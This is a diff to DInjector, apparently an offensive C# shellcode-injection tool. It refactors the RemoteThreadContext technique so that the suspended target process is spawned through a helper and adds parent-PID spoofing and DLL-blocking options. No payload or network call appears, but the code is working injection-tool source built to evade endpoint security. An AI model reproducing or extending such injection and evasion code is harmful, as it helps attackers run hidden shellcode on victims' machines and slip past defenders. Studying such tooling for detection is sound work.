@@ -74,38 +74,18 @@ namespace DInjector
             IntPtr hThread,
             ref Registers.CONTEXT64 lpContext);
 
-        public static void Execute(byte[] shellcodeBytes, string processImage)
+        public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
         {
             var shellcode = shellcodeBytes;
 
             #region CreateProcessA
 
-            IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
-            CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));
-
-            DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO si = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO();
-            DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
-
-            bool result = dCreateProcess(
+            var pi = SpawnProcess.Execute(
                 processImage,
-                null,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                false,
-                DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
-                IntPtr.Zero,
-                null,
-                ref si,
-                out pi);
-
-            if (result)
-            {
-                Console.WriteLine("(RemoteThreadContext) [+] CreateProcess");
-            }
-            else
-            {
-                Console.WriteLine("(RemoteThreadContext) [-] CreateProcess");
-            }
+                @"C:\Windows\System32",
+                suspended: true,
+                ppid: ppid,
+                blockDlls: blockDlls);
 
             #endregion
 
